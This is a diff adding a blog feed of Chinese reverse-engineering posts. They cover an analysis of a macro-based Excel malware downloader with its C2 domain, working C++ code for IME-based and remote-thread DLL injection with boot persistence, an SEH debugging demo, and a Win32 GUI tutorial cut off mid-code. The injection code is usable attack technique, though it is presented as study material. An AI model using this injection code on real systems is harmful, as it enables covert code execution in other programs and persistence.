+    <content type="html"><![CDATA[<h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th>FileName</th><th>FileType</th><th>MD5</th><th>Size</th></tr></thead><tbody><tr><td>58e4d0.xls</td><td>Downloader</td><td>3effeba64d9a1a4dd1bddaeb1858e4d0</td><td>346112  bytes</td></tr><tr><td>## 简介</td><td></td><td></td><td></td></tr><tr><td>带有恶意宏的office文件，加载dll，下载程序执行</td><td></td><td></td><td></td></tr></tbody></table><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p><img src="https://img-blog.csdnimg.cn/20190920145944891.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><h2 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h2><p>有宏，会在你允许宏运行的时候执行起来<br><img src="https://img-blog.csdnimg.cn/20190918202734525.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>首先会切换目录到<code>TMPT</code>下</p><p>然后会调用窗体<code>UserFrom1</code>的<code>Show</code>方法,也就值展示提示窗体<br><img src="https://img-blog.csdnimg.cn/20190918202835482.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>在展示的时候会执行<code>UserFrom_Activate()</code>函数，也就会调用<code>CreatGifFile</code>这个方法<br><img src="https://img-blog.csdnimg.cn/20190918202716893.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>这个方法在模块 modle1中定义<br><img src="https://img-blog.csdnimg.cn/20190918203052154.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>拼接在<code>TEMP</code>下的路径，根据系统位数走不同分支，我这里是win7 32位<br><img src="https://img-blog.csdnimg.cn/20190918203729411.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>下面会拷贝本身到上面拼接好的路径 <code>TempName</code>中，然后复制到<code>ZipName</code>中<br><img src="https://img-blog.csdnimg.cn/20190918205110760.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>会把<code>ZipName</code>文件按压缩包打开，取出<code>xl\embeddings\oleObject1.bin</code>保存到<code>Tmp\oleObject.bin</code>中<br><img src="https://img-blog.csdnimg.cn/20190918205329214.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190918205648726.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>最后会调用<code>ReadAndWriteExtractedBinFile</code>函数，这个函数是在<code>oleObject.bin</code>中找到MZ开头的字符区，然后读取指定字节保存<br><img src="https://img-blog.csdnimg.cn/20190918210305935.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>定义好MZ头标记，方便后面查找<br><img src="https://img-blog.csdnimg.cn/20190918210330686.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>循环查找<code>oleObject.bin</code>中MZ开头的数据，然后拷贝到<code>NewAr</code>数组中<br><img src="https://img-blog.csdnimg.cn/20190918210842310.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>将数组中的数据保存到<code>nm</code>中，也就是 <code>%APPDATA %+\exchange1.dll</code></p><p><img src="https://img-blog.csdnimg.cn/20190918211005818.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>然后程序返回<code>CreateGifFile</code>来执行关键代码，<code>k32LL</code>和<code>Amway</code> 都在模块2中定义<br><img src="https://img-blog.csdnimg.cn/20190918211226396.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><code>k32LL()</code>其实是C语言中的<code>LoadLibraryW()</code><br><code>Amway</code>则是这个dll的一个导出函数</p><h3 id="exchange1-dll"><a href="#exchange1-dll" class="headerlink" title="exchange1.dll"></a>exchange1.dll</h3><p>有壳，先脱壳，这里就说说思路</p><p>这个壳动态开辟空间，将加密的代码放到这个新开空间中，找准时机，dump出来</p><p>然后你会发现还有UPX的壳，UPX就是容易了</p><p>脱完壳之后看导出表<br><img src="https://img-blog.csdnimg.cn/20190919212420668.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>到这里就可以看出来<code>Amway</code>其实是这个dll的到导出函数了</p><p><strong>这个dll是个下载器，能够下载程序执行</strong></p><p>但是首先会获取一系列系统信息</p><p>获取主机名<br><img src="https://img-blog.csdnimg.cn/20190919212558142.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>获取用户名<br><img src="https://img-blog.csdnimg.cn/20190919212740460.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>获取系统版本信息<br><img src="https://img-blog.csdnimg.cn/20190919212819680.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>枚举进程<br><img src="https://img-blog.csdnimg.cn/20190919212846287.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>然后将进程名按 <code>|</code>号隔开<br><img src="https://img-blog.csdnimg.cn/201909192130056.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>后面就开始构造上传数据头了<br><img src="https://img-blog.csdnimg.cn/20190919213616330.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>开始上传本机信息<br><img src="https://img-blog.csdnimg.cn/20190919213725137.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190919213759624.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>上传后会检测response的状态码是否是正常(200)<br><img src="https://img-blog.csdnimg.cn/20190919214012375.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>当上传配置后会get一个文件<br><img src="https://img-blog.csdnimg.cn/20190919214254175.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>这里会创建一个<code>%temp%\boots.exe</code>文件<br><img src="https://img-blog.csdnimg.cn/20190919214316698.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>打开文件，往里面写下载的数据<br><img src="https://img-blog.csdnimg.cn/20190919214453138.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>下面就是核心的地方了，新开一个进程，去执行这个下载的exe程序</p><p><img src="https://img-blog.csdnimg.cn/20190919214602693.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><p>由于目前这个C2地址已经失效，无法获得下载数据，但是能肯定的是这个下载程序才是这个木马的核心，因为这个宏代码中没有用做任何持久化处理。</p><h2 id="IOC"><a href="#IOC" class="headerlink" title="IOC"></a>IOC</h2><table><thead><tr><th>域名</th><th>类型</th></tr></thead><tbody><tr><td><a href="https://office-teml-en.com/tw" target="_blank" rel="noopener">https://office-teml-en.com/tw</a></td><td>C&amp;C</td></tr></tbody></table><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该木马利用加载隐藏在xlsx中的dll来执行命令，根据不同系统释放不同文件，利用网络存储，可以随时改变攻击方式。<br>我们要时刻保持警惕，对未知文件保持怀疑的态度，安装安全软件。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>样本详细分析</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>malware downloader</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>输入法注入</title>
+    <link href="undefined2019/08/26/%E8%BE%93%E5%85%A5%E6%B3%95%E6%B3%A8%E5%85%A5/"/>
+    <url>2019/08/26/%E8%BE%93%E5%85%A5%E6%B3%95%E6%B3%A8%E5%85%A5/</url>
+    
+    <content type="html"><![CDATA[<h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><p>因为输入法的本身特性，能注入任何一个程序，还可以开机启动，很是友好</p><p>网上大都是一个版本方法，我记录下我自己过程</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>1.编写一个正常的输入法<br>2.将它安装到电脑上，并设置为默认输入法，这样就可以在程序打开的时候就调用它的处理函数</p><p>因为输入是一个特殊的dll，本质就是一个dll，只是后最不同而已。</p><p>一个最简ime文件都必须两个函数</p><p>一个<code>dllmain()</code> 还有一个<code>ImeInquire()</code>这两个是必须的</p><h3 id="编写输入法主要文件"><a href="#编写输入法主要文件" class="headerlink" title="编写输入法主要文件"></a>编写输入法主要文件</h3><p>创建一个dll项目,解释都在注释中（注意项目为多字节字符集）<br><code>dllmain.cpp</code></p><pre><code class="C">#include &quot;stdafx.h&quot;#include &quot;windows.h&quot;#include &quot;imm.h&quot;#include &quot;immdev.h&quot;#pragma comment(lib,&quot;imm32.lib&quot;)LPCSTR injectDllPaht = &quot;C://expDll.dll&quot;; //我们最终利用的Dll，写入自己的功能void injectDLL();//定义函数，下面用LRESULT WINAPI UIWndProc(HWND hUIWnd,                         UINT message,                        WPARAM wParam,                         LPARAM lParam) { return 0; }//窗口消息处理函数，可以不要BOOL APIENTRY DllMain(HMODULE hModule,    DWORD  ul_reason_for_call,    LPVOID lpReserved    )//主函数的标准格式{    HINSTANCE hinstDLL = (HINSTANCE)hModule;//下面需要用这个句柄，格式强转以下    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:    {        //定义一个窗口类           WNDCLASSEX wc;           wc.cbSize = sizeof(WNDCLASSEX);           wc.style = CS_VREDRAW | CS_HREDRAW | CS_DBLCLKS | CS_IME;           wc.lpfnWndProc = UIWndProc;           wc.cbClsExtra = 0;           wc.cbWndExtra = 2 * sizeof(LONG);           wc.hInstance = hinstDLL;           wc.hCursor = LoadCursor(NULL, IDC_ARROW); //IDC_ARROW           wc.hIcon = NULL;           wc.lpszMenuName = (LPTSTR)NULL;           wc.lpszClassName = TEXT(&quot;CInjWindow&quot;);//定义的窗口类的名字           wc.hbrBackground = NULL;           wc.hIconSm = NULL;           if (!RegisterClassEx((LPWNDCLASSEX)&amp;wc))//注册这个窗口，IME必须要注册一个窗口才能安装           {               break;           }           injectDLL();//干事的func           break;    }    case DLL_THREAD_ATTACH:        break;    case DLL_THREAD_DETACH:        break;    case DLL_PROCESS_DETACH:        UnregisterClass(&quot;CInjWindow&quot;, hinstDLL);//程序退出时注销窗口实例        break;    }    return TRUE;}void injectDLL(){    WCHAR Mes[MAX_PATH];    //这里就可以写注入func，我这里就调用一个自己写的测试dll，每次加载的时候都会打印父窗口名称    HMODULE hMyDll = LoadLibrary(injectDllPaht);//因为现在已经在别的进程中，所以导入后的就成功注入想要的进程了    if (!hMyDll)    {        DWORD ERRCODE = GetLastError();        MessageBox(0, (LPCSTR)ERRCODE, 0, 0);    }    else    {        HMODULE hParentM = GetModuleHandle(0);        //FARPROC fRunFunc = GetProcAddress(hMyDll, &quot;Run&quot;);        //fRunFunc();    }}BOOL WINAPI ImeInquire(LPIMEINFO lpImeInfo, LPTSTR lpszUIClass, LPCTSTR lpszOption){    //初始化ImeInquire    //这个函数是除了DllMain后第一个会被win32 调用的函数. 通过调用这个函数知道你的输入法有什么特性.    lpImeInfo-&gt;dwPrivateDataSize = 0;    lpImeInfo-&gt;fdwProperty = IME_PROP_KBD_CHAR_FIRST | IME_PROP_UNICODE | IME_PROP_IGNORE_UPKEYS | IME_PROP_SPECIAL_UI;    lpImeInfo-&gt;fdwConversionCaps = IME_CMODE_NATIVE | IME_CMODE_NOCONVERSION;    lpImeInfo-&gt;fdwSentenceCaps = 0;    lpImeInfo-&gt;fdwUICaps = UI_CAP_ROT90;    lpImeInfo-&gt;fdwSCSCaps = SCS_CAP_COMPSTR | SCS_CAP_MAKEREAD;    lpImeInfo-&gt;fdwSelectCaps = (DWORD)0;    lstrcpy(lpszUIClass, &quot;CInjWindow&quot;);//注意这里，对ImeInquire赋予我们刚刚创建的类    return TRUE;}</code></pre><p>因为输入法需要图标，所以需要添加资源文件，右键dll项目添加<br><img src="https://img-blog.csdnimg.cn/20190826175254835.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>添加位图<br><img src="https://img-blog.csdnimg.cn/20190826175356971.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>要修改version值如下</p><p><img src="https://img-blog.csdnimg.cn/20190826174911782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><p>然后生成就好了</p><h3 id="真正需要注入的dll"><a href="#真正需要注入的dll" class="headerlink" title="真正需要注入的dll"></a>真正需要注入的dll</h3><p>其实干正事的过程也可以直接放到ime中，但是步方便管理，我这里写出来了<br>也是一个dll项目</p><p>因为我只是测试，所以就写的很简单，一个验证父进程函数名的就可以了。（游戏辅助代码就可以写在这）<br><strong>dllmain.cpp</strong>如下</p><pre><code class="c">    case DLL_PROCESS_ATTACH:        //获取当前程序名        GetModuleFileName(GetModuleHandle(0),lpFileName,sizeof(lpFileName));        //打印出来        MessageBox(0,lpFileName, 0, 0);}</code></pre><h3 id="加载ime"><a href="#加载ime" class="headerlink" title="加载ime"></a>加载ime</h3><p>把上面生成的<strong>dll</strong>改名为<strong>ime</strong>结尾，复制到<strong>windows32</strong>目录下</p><p>接下来创建一个控制台项目</p><p>如下</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &quot;windows.h&quot;#include &quot;imm.h&quot;#pragma comment(lib,&quot;imm32.lib&quot;)int _tmain(int argc, _TCHAR* argv[]){    if (argc&lt;3)    {        MessageBox(0, &quot;请注意参数 exp：exeName.exe imeName.ime Jerry&quot;, 0, 0);        return 0;    }    LPCSTR infecPath = argv[1];    LPCSTR infecName = argv[2];    PVOID m_retV;    //得到默认的输入法句柄并保存    ::SystemParametersInfo(        SPI_GETDEFAULTINPUTLANG,        0,        &amp;m_retV,        0);    //安装输入法    HKL m_hImeFile = ImmInstallIME(        infecPath,        infecName);    if (ImmIsIME(m_hImeFile))    {        //设置为默认输入法        SystemParametersInfo(            SPI_SETDEFAULTINPUTLANG,            0,            &amp;m_hImeFile,            SPIF_SENDWININICHANGE);        MessageBox(0, &quot;安装输入法成功&quot;, 0, 0);    }    else    {        MessageBox(0, &quot;error 安装出错了&quot;, 0, 0);    }}</code></pre><p>把编译生成的exe文件也拷贝到<strong>windows32</strong>下</p><p>安装命令如下    <code>exeName.exe imeName.ime Jerry</code></p><p>安装程序可以自由发挥，只要把ime文件安装到系统上就是了</p><h3 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h3><p>当你安装成功后，就会有弹窗提示，你打开任意一个程序，都会有弹窗提示这个程序的路径。这就说明已经注入成功了。</p><p>开机后在切换输入法时也会启动</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>逆向</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>注入</tag>
+      
+      <tag>开机启动</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>远线程注入</title>
+    <link href="undefined2019/08/26/%E8%BF%9C%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/"/>
+    <url>2019/08/26/%E8%BF%9C%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/</url>
+    
+    <content type="html"><![CDATA[<h3 id="什么是远线程注入"><a href="#什么是远线程注入" class="headerlink" title="什么是远线程注入"></a>什么是远线程注入</h3><p>在一个进程中，调用CreateThread或CreateRemoteThreadEx函数，在另一个进程内创建一个线程（因为不在同一个进程中，所以叫做远程线程）。创建的线程一般为Windows API函数LoadLibrary，来加载一个动态链接库(DLL)，从而达到在另一个进程中运行自己所希望运行的代码的目的。</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>下面例子是根据查询一打开窗口中的计算器进程，然后<br><img src="https://img-blog.csdnimg.cn/20190826100826723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>注释都很详细 </p><pre><code class="c">#include &quot;windows.h&quot;#include &quot;Tlhelp32.h&quot;int InjectDll(DWORD dwProcessId, PTCHAR szDllName);int EnablePrivilege(bool isStart);DWORD GetProcessId(PTCHAR pszProcessName);void main(){    DWORD ProcessId = GetProcessId(&quot;calc.exe&quot;);\\目标程序    InjectDll(ProcessId ,&quot;C:\\Users\\sam\\Desktop\\A.dll&quot;);\\注入dll的地址}int InjectDll(DWORD dwProcessId, PTCHAR szDllName){    if (szDllName[0] == NULL)        return -1;    //提高权限相关操作    EnablePrivilege(TRUE);    //1. 打开进程    HANDLE hProcess = OpenProcess(  PROCESS_ALL_ACCESS,   //打开进程权限        FALSE,                                              //是否可继承         dwProcessId);                                       //进程ID    if (hProcess == INVALID_HANDLE_VALUE)        return -1;    //2. 在远程进程中申请空间    LPVOID pszDllName = VirtualAllocEx(hProcess, //远程进程句柄        NULL,                                  //建议开始地址        4096,                                  //分配空间大小        MEM_COMMIT,                            //空间初始化全0        PAGE_EXECUTE_READWRITE);               //空间权限    if (NULL == pszDllName)    {        return -1;    }    //3. 向远程进程中写入数据    BOOL bRet = WriteProcessMemory( hProcess, pszDllName,         szDllName, MAX_PATH, NULL);    if (NULL == bRet)    {        return -1;    }    //4. 在远程进程中创建远程线程    HANDLE m_hInjecthread = CreateRemoteThread(hProcess,      //远程进程句柄    NULL,                                            //安全属性    0,                                               //栈大小    (LPTHREAD_START_ROUTINE)LoadLibrary,             //进程处理函数        pszDllName,                                      //传入参数    NULL,                                            //默认创建后的状态    NULL);                                           //线程ID    if (NULL == m_hInjecthread)    {        DWORD dwErr = GetLastError();        return -1;    }    //5. 等待线程结束返回    DWORD dw = WaitForSingleObject(m_hInjecthread, -1);    //6. 获取线程退出码,即LoadLibrary的返回值，即dll的首地址    DWORD dwExitCode;    GetExitCodeThread(m_hInjecthread, &amp;dwExitCode);    HMODULE m_hMod = (HMODULE)dwExitCode;    //7. 释放空间    BOOL bReturn = VirtualFreeEx(hProcess, pszDllName,         4096, MEM_DECOMMIT);    if (NULL == bReturn)    {        return -1;    }    CloseHandle(hProcess);    hProcess = NULL;    //恢复权限相关操作    EnablePrivilege(FALSE);    return 0;}int EnablePrivilege(bool isStart){            //1. 得到令牌句柄    HANDLE  hToken = NULL;      //令牌句柄      if (!OpenProcessToken( GetCurrentProcess(),         TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY | TOKEN_READ,         &amp;hToken))    {           return FALSE;    }    //2. 得到特权值    LUID    luid = {0};         //特权值    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;luid))    {        return FALSE;    }    //3. 提升令牌句柄权限    TOKEN_PRIVILEGES tp = {0};  //令牌新权限    tp.PrivilegeCount = 1;     tp.Privileges[0].Luid = luid;    tp.Privileges[0].Attributes = isStart ? SE_PRIVILEGE_ENABLED : 0;    if (!AdjustTokenPrivileges(hToken, FALSE, &amp;tp, 0, NULL, NULL))    {        return FALSE;    }    //4. 关闭令牌句柄    CloseHandle(hToken);    return 0;}DWORD GetProcessId(PTCHAR pszProcessName){    HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);//获取当前系统的快照，这种方法能拿到想要的进程ID    if (INVALID_HANDLE_VALUE == hProcess)    {        return 0;    }    DWORD dwProcessId = 0;    PROCESSENTRY32 process32 = {0};    process32.dwSize = sizeof(PROCESSENTRY32);    BOOL bRetProcess = FALSE;    bRetProcess = Process32First(hProcess, &amp;process32);    do    {        if (strcmp(pszProcessName, process32.szExeFile) == 0)//名称对上，获取其进程ID        {            dwProcessId = process32.th32ProcessID;            break;        }        bRetProcess = Process32Next(hProcess, &amp;process32);    }while (bRetProcess);    CloseHandle(hProcess);    return dwProcessId;}</code></pre>]]></content>
+    
+    
+    <categories>
+      
+      <category>逆向</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>注入</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>SEH创建与查找</title>
+    <link href="undefined2019/08/26/SEH%E5%88%9B%E5%BB%BA%E4%B8%8E%E6%9F%A5%E6%89%BE/"/>
+    <url>2019/08/26/SEH%E5%88%9B%E5%BB%BA%E4%B8%8E%E6%9F%A5%E6%89%BE/</url>
+    
+    <content type="html"><![CDATA[<p>创建一个SEH处理函数</p><pre><code>#include &quot;stdafx.h&quot;#define WIN32_LEAN_AND_MEAN#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &quot;stdlib.h&quot;DWORD scratch;EXCEPTION_DISPOSITION exceptHandler(struct _EXCEPTION_RECORD *ExceptionRecord,                        void * EstablisherFrame,                        struct _CONTEXT *ContextRecord,                        void * DispatcherContext){    unsigned i;    MessageBox(0,_T(&quot;i am in except!!!&quot;),0,0);    ContextRecord-&gt;Eax = (DWORD)&amp;scratch;//将eax的值修改为一个全局变量的地址，就可以写入了    //printf(&quot;%08X \n &quot;, ContextRecord-&gt;Eip);//0x4114c5    ContextRecord-&gt;Eip += 0x2A;//这里修改的EIP，等于修改恢复异常后下一要执行的语句    return ExceptionContinueExecution;//这是异常处理的返回结果，让程序返回执行ContextRecord-&gt;Eip的代码}int main(){    __asm    {        push exceptHandler // handler函数的地址        push FS:[0] // 保存上一级的SEH链地址        mov FS:[0],ESP // 安装新的EXECEPTION_REGISTRATION结构    }    __asm    {        mov eax, 0     // 将EAX清零        mov[eax], 1 // 向0地址写入，会产生访问异常    }    printf(&quot;Yes you right!!!\n&quot;);    __asm    {        mov    eax, [ESP]    // 获取前一个结构        mov FS:[0], EAX // 恢复之前的链        add esp, 8       // 恢复堆栈    }    return 0;    printf(&quot;Hello Cray\n&quot;);    exit(0);}</code></pre><p><img src="D:%5Cgit%E7%AC%94%E8%AE%B0%5Csource_posts%5C20190826" srcset="/img/loading.gif" alt></p><p>Wingdb 调试如图断下，地址访问异常</p><p>我来看看在内存中的什么位置</p><p>因为SHE链在线程环境块结构偏移为0的地方</p><pre><code>0:000&gt; !tebTEB at 7ffdf000    ExceptionList:        0012fe4c    StackBase:            00130000    StackLimit:           0012e000    SubSystemTib:         00000000    FiberData:            00001e00    ArbitraryUserPointer: 00000000    Self:                 7ffdf000    EnvironmentPointer:   00000000    ClientId:             000026a8 . 0000275c    RpcHandle:            00000000    Tls Storage:          7ffdf02c    PEB Address:          7ffd9000    LastErrorValue:       0    LastStatusValue:      c0000139    Count Owned Locks:    0    HardErrorMode:        0</code></pre><p>查看teb结构地址。接下来我们将这个地址与TEB结构对应</p><pre><code>0:000&gt; dt _teb 7ffdf000 .ntdll!_TEB   +0x000 NtTib            :       +0x000 ExceptionList    : 0x0012fe4c _EXCEPTION_REGISTRATION_RECORD      +0x004 StackBase        : 0x00130000 Void      +0x008 StackLimit       : 0x0012e000 Void      +0x00c SubSystemTib     : (null)       +0x010 FiberData        : 0x00001e00 Void      +0x010 Version          : 0x1e00      +0x014 ArbitraryUserPointer : (null)       +0x018 Self             : 0x7ffdf000 _NT_TIB   +0x01c EnvironmentPointer :    +0x020 ClientId         :       +0x000 UniqueProcess    : 0x000026a8 Void      +0x004 UniqueThread     : 0x0000275c Void   +0x028 ActiveRpcHandle  :    +0x02c ThreadLocalStoragePointer :    +0x030 ProcessEnvironmentBlock : </code></pre><p>可以看到<code>_EXCEPTION_REGISTRATION_RECORD</code> 结构的地址为</p><p>0x0012fe4c </p><pre><code class="0:000&gt;">Exceptions1!_EXCEPTION_REGISTRATION_RECORD   +0x000 Next             : 0x0012ff70 _EXCEPTION_REGISTRATION_RECORD   +0x004 Handler          : 0x004110a0     _EXCEPTION_DISPOSITION  Exceptions1!ILT+155(?_except_handler1YAKPAU_EXCEPTION_RECORDPAXPAU_CONTEXT+0</code></pre><p>Next指向下一个处理函数，Handler指向当前SHE的处理函数</p><pre><code>0:000&gt; u 0x004110a0     Exceptions1!ILT+155(?_except_handler1YAKPAU_EXCEPTION_RECORDPAXPAU_CONTEXT:004110a0 e91b030000      jmp     Exceptions1!_except_handler1 (004113c0)Exceptions1!ILT+160(__initterm):004110a5 e984220000      jmp     Exceptions1!initterm (0041332e)Exceptions1!ILT+165(___crtTerminateProcess):004110aa e9cd220000      jmp     Exceptions1!_crtTerminateProcess (0041337c)Exceptions1!ILT+170(___report_securityfailure):004110af e99c0d0000      jmp     Exceptions1!__report_securityfailure (00411e50)Exceptions1!ILT+175(___atonexitinit):004110b4 e9271f0000      jmp     Exceptions1!__atonexitinit (00412fe0)Exceptions1!ILT+180(__RTC_UninitUse):004110b9 e962180000      jmp     Exceptions1!_RTC_UninitUse (00412920)Exceptions1!ILT+185(___report_securityfailureEx):004110be e99d0e0000      jmp     Exceptions1!__report_securityfailureEx (00411f60)Exceptions1!ILT+190(__RTC_Shutdown):004110c3 e9d8060000      jmp     Exceptions1!_RTC_Shutdown (004117a0)</code></pre><p>我们看汇编代码，看看具体SHE的实现，因为我是debug版本的程序，所以由上面的跳转</p><pre><code>0:000&gt; u 4113c0 .004113c0 55              push    ebp004113c1 8bec            mov     ebp,esp004113c3 81eccc000000    sub     esp,0CCh004113c9 53              push    ebx004113ca 56              push    esi004113cb 57              push    edi004113cc 8dbd34ffffff    lea     edi,[ebp-0CCh]004113d2 b933000000      mov     ecx,33h004113d7 b8cccccccc      mov     eax,0CCCCCCCCh004113dc f3ab            rep stos dword ptr es:[edi]004113de 8bf4            mov     esi,esp004113e0 6858584100      push    offset Exceptions1!`string&#39; (00415858)004113e5 ff1514914100    call    dword ptr [Exceptions1!_imp__printf (00419114)]004113eb 83c404          add     esp,4004113ee 3bf4            cmp     esi,esp</code></pre><p>这就是我们自己加的SHE处理函数</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>逆向</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>SEH</tag>
+      
+      <tag>Windbg</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>win32程序设计</title>
+    <link href="undefined2019/08/25/win32%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
+    <url>2019/08/25/win32%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/</url>
+    
+    <content type="html"><![CDATA[<p>最小的一个窗口</p><pre><code class="c">#include &quot;windows.h&quot;HINSTANCE g_hInstance;LRESULT CALLBACK MainWndProc(_In_ HWND hWnd,_In_ UINT uMsg,_In_ WPARAM wParam,_In_ LPARAM lParam){    //每一个发给这个窗体的消息,通过不同的uMsg消息来做不同的动作，wParam和lParam保存的是这个消息的具体参数    switch(uMsg)    {    case WM_CREATE:    //这里可以添加创建时的界面选项，不要做耗时操作。        break;    case WM_CLOSE:        break;    case  WM_COMMAND:        break;    case WM_LBUTTONDOWN:        MessageBox(0,&quot;单击后的效果&quot;,&quot;Title&quot;,MB_OK);        break;    case WM_DESTROY:        PostQuitMessage(0);//按关闭按钮后，向GetMessage发送一个关闭的消息，然他退出循环，结束进程        break;    default:        return DefWindowProc(hWnd,uMsg,wParam,lParam);    }    return DefWindowProc(hWnd, uMsg, wParam, lParam);}int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd){    g_hInstance = hInstance;    WNDCLASS MyWcs= {};    MyWcs.lpszClassName = &quot;LpszClassName&quot;;    MyWcs.lpfnWndProc = MainWndProc;////这里定义消息处理函数 很重要    MyWcs.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH+2);           MyWcs.style = CS_HREDRAW | CS_VREDRAW;    RegisterClass(&amp;MyWcs);//注册为窗口类     HWND hWnd = CreateWindow(        &quot;LpszClassName&quot;,           //   这个名字要和上面定义的lpszClassName名字一致        &quot;Sample_Tile&quot;,            // title-bar string         WS_OVERLAPPEDWINDOW, // top-level window         CW_USEDEFAULT,       // default horizontal position         CW_USEDEFAULT,       // default vertical position         290,       // default width         500,       // default height         (HWND) NULL,         // no owner window         (HMENU) NULL,        // use class menu         hInstance,           // handle to application instance         (LPVOID) NULL);      // no window-creation data     ShowWindow(hWnd,SW_SHOW);//展示窗口，不不展示的话你看不到图案，程序会在后台运行     MSG msg = {};    while (GetMessage(&amp;msg,NULL,NULL,NULL))    {        TranslateMessage(&amp;msg);        DispatchMessage(&amp;msg);    }}</code></pre><p><img src="https://img-blog.csdnimg.cn/20190821190947895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><p>以上就是一个最基本窗体了，最重要的是以下几步</p><p><strong>1.定义窗口类:定义了这个类的回调函数，也就是说使用这个类创建的窗体的消息由这里设置的函数处理。这个类控制着这个窗口的样式，比如颜色，背景，风格等等，这个窗口类可以多次使用。</strong></p><p><strong>2.创建窗口:现在你就可以使用上面定义好的类，来创建一个窗口，可以控制窗口出现的位置，大小和一些其他选项</strong></p><p><strong>3.创建循环接收消息:因为Windows是消息机制，循环接收发给控件的消息，我们就可以处理这些消息，这些消息比如鼠标点击了窗体，键盘按下了某个键，或者点击了那个按钮，这些都是不同的消息类型</strong></p><p>下面是使用win32控制计算机的模拟按键<img src="https://img-blog.csdnimg.cn/20190822104205612.gif" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>这里只贴核心代码，其他都一样</p><pre><code class="c">LRESULT CALLBACK OnWndCommand(_In_  HWND hwnd,_In_  UINT uMsg, _In_  WPARAM wParam,_In_  LPARAM lParam){    switch (HIWORD(wParam))// wParam高2位保存的是通知码，低2位保存的是控件ID    {    case BN_CLICKED:        {            switch (LOWORD(wParam))            {            case 0x1000:            case 0x1001:            case 0x1002:                {                    HWND hCalc = FindWindowA(NULL,&quot;计算器&quot;);                    if(!hCalc)                 